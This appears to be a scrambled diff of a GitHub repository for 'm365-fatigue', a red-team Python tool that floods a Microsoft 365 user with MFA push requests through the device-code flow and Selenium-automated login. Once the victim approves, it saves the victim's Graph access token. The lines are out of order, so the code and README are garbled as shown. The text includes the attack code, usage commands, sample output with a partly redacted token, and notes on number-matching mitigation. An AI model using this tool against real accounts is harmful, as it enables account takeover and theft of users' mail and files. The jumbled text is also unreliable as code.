@@ -1,0 +1,294 @@
+    
+        
+            
+                
+                    break
+                    button.click()
+                    file_a.write(access_token)
+                break
+                continue_polling = False
+                fireprox_url = next(args)
+                interval = next(args)
+                pass
+                password = next(args)
+                print(access_token)
+                return True
+                time.sleep(3)
+                token_array = json.loads(base64.b64decode(token_payload).decode('utf-8'))
+                token_expire = base_date 
+                tokens_response = requests.post(fireprox_url
+                user = next(args)
+            arg = next(args)
+            break
+            details = e.response.json()
+            else:
+            for button in sbmt_button:
+            if fireprox_url:
+            pass
+            remaining_time = time_limit - int(time.time() - start_time)
+        code_fld.clear()
+        code_fld.send_keys(Keys.RETURN)
+        code_fld.send_keys(code)
+        device_code_response = requests.post(fireprox_url
+        driver.delete_all_cookies()
+        driver.get(fireprox_url
+        else:
+        except requests.exceptions.HTTPError as e:
+        if not password:
+        if sbmt_button:
+        pass
+        pass_fld.clear()
+        pass_fld.send_keys(Keys.RETURN)
+        pass_fld.send_keys(password)
+        print(fireprox_url
+        sys.exit()
+        token_body = {
+        try:
+        usr_fld.clear()
+        usr_fld.send_keys(Keys.RETURN)
+        usr_fld.send_keys(user)
+        while True:
+        }
+    access_token = None
+    args = iter(sys.argv[1:])
+    device_code_body = {
+    driver = webdriver.Chrome()
+    driver.quit()
+    else:
+    except StopIteration:
+    except TimeoutException:
+    fireprox_url = None
+    headers = {
+    if fireprox_url:
+    if user:
+    interval = 60
+    password = None
+    print(driver.current_url)
+    print(driver.title)
+    remaining_time = time_limit
+    return False
+    start_time = time.time()
+    time_limit = float(interval)
+    try:
+    user = None
+    while True:
+    while time.time() - start_time < time_limit:
+    }
+   pip install -r requirements.txt
+ '=' 
+ Acknowledgements
+ Applicability
+ Azure AD / Microsoft identity platform app configuration
+ Credits 
+ Display device code message
+ Generating filenames
+ Generating timestamp
+ Installation
+ License
+ Microsoft 365 MFA Bombing Script
+ Notes
+ Perform device code request
+ Poll for access token using device code
+ Running the Script
+ Sample output
+ Storing access token as Base64 encoded version with timestamp
+ Storing access token in JSON format with timestamp
+ TODO
+ TODO implement fireprox compability - it's buggy...
+ Usage
+ Win64
+ len(password))
+ password combination was compromised it can be used to flood the authenticator app with authentication requests.
+"                    json.dump(token_array, file_b, indent=4)"
+"                    print(f""Stored Base64 encoded access token as '{txt_filename}'"")"
+"                    print(f""Stored decoded access token as '{json_filename}'"")"
+"                access_token = tokens_response[""access_token""]"
+"                base_date = datetime(1970, 1, 1)"
+"                if ""display: none"
+"                json_filename = f""access_token_{username}_{timestamp}.json"""
+"                print(""Base64 encoded JWT access_token:"")"
+"                print(""Decoded JWT payload:"")"
+"                print(""Error:"", details.get(""error""))"
+"                print(""["
+"                print(json.dumps(token_array, indent=4))"
+"                tenant_id = token_array[""tid""]"
+"                timestamp = datetime.now().strftime(""%Y%m%d%H%M%S"")"
+"                token_payload = access_token.split(""."")[1] "
+"                tokens_response = requests.post(""https://login.microsoftonline.com/common/oauth2/token"
+"                txt_filename = f""access_token_{username}_{timestamp}.txt"""
+"                with open(json_filename, ""w"") as file_b:"
+"                with open(txt_filename, ""w"") as file_a:"
+"            ""client_id"": client_id,"
+"            ""code"": device_code,"
+"            ""grant_type"": ""urn:ietf:params:oauth:grant-type:device_code"","
+"            ""scope"": ""openid"""
+"            elif arg == ""--fireprox"":"
+"            elif arg == ""--interval"":"
+"            elif arg == ""--password"":"
+"            if ""access_token"" in tokens_response:"
+"            if arg == ""--user"":"
+"            if details.get(""error"") == ""authorization_pending"":"
+"            password = getpass.getpass(prompt=""Enter your password: "")"
+"            print(f""Remaining time: {remaining_time} seconds"", end="""
+"        "" ... [dedacted] ... """
+"        ""Content-Type"": ""application/x-www-form-urlencoded"","
+"        ""User-Agent"": user_agent"
+"        ""client_id"": client_id,"
+"        ""mfa"""
+"        ""pwd"","
+"        ""resource"": resource"
+"        code_fld = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, ""otc"")))"
+"        device_code_response = requests.post(""https://login.microsoftonline.com/common/oauth2/devicecode"
+"        driver.get(""https://login.microsoftonline.com/common/oauth2/deviceauth"")"
+"        if init_polling(driver, client_id, user_code, user, interval, device_code, headers, fireprox_url):"
+"        login_automation(driver, user_code, user, password, fireprox_url)"
+"        pass_fld = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, ""passwd"")))"
+"        print(""Code field not found within 10 seconds"")"
+"        print(""Login field not found within 10 seconds"")"
+"        print(""Password field not found within 10 seconds"")"
+"        print(""Password will be prompted if not supplied directly!"
+"        print(""Usage:"")"
+"        print(""["
+"        print(""python3 m365-fatigue.py --user <username> [--password <password>] [--interval <seconds> (default: 60)]"
+"        print_vars(user, password, fireprox_url)"
+"        sbmt_button = driver.find_elements(By.ID, ""idSIButton9"")"
+"        user_code, device_code = get_code(client_id, resource, headers, fireprox_url)"
+"        usr_fld = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, ""loginfmt"")))"
+"    ""acct"": 0,"
+"    ""acr"": ""1"","
+"    ""aio"": "" ... [dedacted] ... "","
+"    ""amr"": ["
+"    ""app_displayname"": ""Microsoft Office"","
+"    ""appid"": "" ... [dedacted] ... "","
+"    ""appidacr"": ""0"","
+"    ""aud"": ""https://graph.microsoft.com"","
+"    ""exp"": 1701433450,"
+"    ""family_name"": "" ... [dedacted] ... "","
+"    ""given_name"": "" ... [dedacted] ... "","
+"    ""iat"": 1701428346,"
+"    ""idtyp"": ""user"","
+"    ""ipaddr"": "" ... [dedacted] ... "","
+"    ""iss"": ""https://sts.windows.net/90931373-6ad6-49cb-9d8c-22eebb6968fa/"","
+"    ""name"": "" ... [dedacted] ... "","
+"    ""nbf"": 1701428346,"
+"    ""oid"": "" ... [dedacted] ... "","
+"    ""onprem_sid"": "" ... [dedacted] ... "","
+"    ""platf"": ""3"","
+"    ""puid"": "" ... [dedacted] ... "","
+"    ""rh"": "" ... [dedacted] ... "","
+"    ""scp"": ""AuditLog.Read.All Calendar.ReadWrite Calendars.Read.Shared Calendars.ReadWrite Contacts.ReadWrite DataLossPreventionPolicy.Evaluate Directory.AccessAsUser.All Directory.Read.All Files.Read Files.Read.All Files.ReadWrite.All Group.Read.All Group.ReadWrite.All InformationProtectionPolicy.Read Mail.ReadWrite Notes.Create Organization.Read.All People.Read People.Read.All Printer.Read.All PrintJob.ReadWriteBasic SensitiveInfoType.Detect SensitiveInfoType.Read.All SensitivityLabel.Evaluate Tasks.ReadWrite TeamMember.ReadWrite.All TeamsTab.ReadWriteForChat User.Read.All User.ReadBasic.All User.ReadWrite Users.Read"","
+"    ""sub"": "" ... [dedacted] ... "","
+"    ""tenant_region_scope"": ""EU"","
+"    ""tid"": "" ... [dedacted] ... "","
+"    ""unique_name"": "" ... [dedacted] ... "","
+"    ""upn"": "" ... [dedacted] ... "","
+"    ""uti"": "" ... [dedacted] ... "","
+"    ""ver"": ""1.0"","
+"    ""wids"": ["
+"    ""xms_tcdt"":  ... [dedacted] ... ,"
+"    ""xms_tdbr"": ""EU"""
+"    ],"
+"    client_id = ""d3590ed6-52b3-4102-aeff-aad2292ab01c"""
+"    print(""Exiting..."")"
+"    print(""["
+"    print(device_code_response[""message""])  "
+"    resource = ""https://graph.microsoft.com"" "
+"    return device_code_response[""user_code""], device_code_response[""device_code""]"
+"    user_agent = ""Mozilla/5.0 (Windows NT 10.0"
+" ((4 - len(access_token.split(""."")[1]) % 4) % 4)"
+" Print remaining time, overwrite previous output"
+" timedelta(seconds=token_array[""exp""])"
+" x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042"""
+""" not in button.get_attribute(""style""):    "
+"""common/oauth2/deviceauth"")"
+"""common/oauth2/devicecode"
+"""oauth2/devicecode"
+"""oauth2/token"
+"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
+"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
+"If you find environments that still rely on classic push notifications, this attack vector should still work fine. Also I leave it to your own creativity to find applicable scenarios "
+"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
+"Once the second factor has been approved the valid JWT access_token will be stored in decoded and encoded format locally. The token can be reused in other tools like [TokenTactics](https://github.com/f-bader/TokenTacticsV2), [GraphRunner](https://github.com/dafthack/GraphRunner) or manual requesting different endpoints in Azure..."
+"Permission is hereby granted, free of charge, to any person obtaining a copy"
+"Replace <username> with the target Microsoft 365 username. The password can be provided directly after the --password flag, or the script will prompt for it if not supplied."
+"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
+"This script utilizes Selenium, which requires a compatible WebDriver (in this case, Chrome WebDriver... but you can change it towards something else if you need to)."
+"To run the script, execute the following command:"
+"To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code GKZAQ433Q to authenticate."
+"] Device code:"")"
+"] Fireprox URL:"", fireprox_url)"
+"] Getting code via fireprox:"")"
+"] Password:"", """
+"] Storing token..."")"
+"] Successful authentication. Access token expires at:"", token_expire)"
+"] Username:"", user)"
+"api-version=1.0"")"
+"api-version=1.0"", headers=headers, data=device_code_body).json()"
+"api-version=1.0"", headers=headers, data=token_body).json()"
+"copies of the Software, and to permit persons to whom the Software is"
+"def get_code(client_id, resource, headers, fireprox_url=None):"
+"def init_polling(driver, client_id, user_code, username, interval, device_code, headers, fireprox_url=None):"
+"def login_automation(driver, code=None, user=None, password=None, fireprox_url=None):"
+"def print_vars(user, password, fireprox_url=None):"
+"from datetime import datetime, timedelta"
+"furnished to do so, subject to the following conditions:"
+"if __name__ == ""__main__"":"
+"in the Software without restriction, including without limitation the rights"
+"of this software and associated documentation files (the ""Software""), to deal"
+"r"")  "
+"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
+- Number Matching
+- Passwordless Sign-in
+- Phone Sign-in
+- Push Notification Approval
+- Time-Based One-Time Password (TOTP)
+1. Clone this repository.
+2. Install the required dependencies by running:
+As of May 2023 Microsoft mostly disarmed this fatigue bombing attacks by enforcing the number matching mechanism which require the user to manually enter a two digit number which is presented in the browser as part of the login flow. Generally speaking that breaks simple flooding attacks as only the victim is in possession of the matching number. However one could still retreive the information via real-time social engineering.
+Base64 encoded JWT access_token:
+Bei Ihrem Konto anmelden
+Copyright (c) 2023 0xB455
+Decoded JWT payload:
+Enter your password: 
+Exiting...
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+Heavily inspired by the awesome work of Steve Borosh ([@rvrsh3ll](https://github.com/rvrsh3ll)) and Beau Bullock ([@dafthack](https://github.com/dafthack)). Huge kudos to them for all the awesome research and tooling they release.
+In case a username 
+It is intended to be used in Social Engineering / Red-Team / Pentesting scenarios when targeting O365/MS-Online users in Azure (now called Entra ID).
+It keeps bombing the user with MFA requests and stores the access_token once the MFA was approved.
+MIT License
+Microsoft used to offer different MFA authentication mechanisms within their authenticator app like:
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+Stored Base64 encoded access token as 'access_token_user@domain.com_20231201120406.txt'
+Stored decoded access token as 'access_token_user@domain.com_20231201120406.json'
+The --interval flag allows you to set the polling interval in seconds (default is 60 seconds).
+The above copyright notice and this permission notice shall be included in all
+The fireprox implementation is yet not finished and may or may not be implemented in the future...
+This Python script automates the authentication process for Microsoft 365 by using the device code flow and Selenium for automated login.
+This project is licensed under the [MIT License](https://chat.openai.com/c/LICENSE)
+] Device code:
+] Password: 
+] Storing token...
+] Successful authentication. Access token expires at: 2023-12-01 12:24:10
+] Username: user@domain.com
+bash
+copies or substantial portions of the Software.
+eyJ0 ... [dedacted] ... dsgHmA
+from selenium import webdriver
+from selenium.common.exceptions import StaleElementReferenceException
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support.wait import WebDriverWait
+https://login.microsoftonline.com/common/oauth2/deviceauth
+import base64
+import getpass
+import json
+import requests
+import sys
+import time
+m365-fatigue python3 m365-fatigue.py --user user@domain.com
+python m365-fatigue.py --user <username> [--password <password>] [--interval <seconds> (default: 60)]
+requests
+selenium
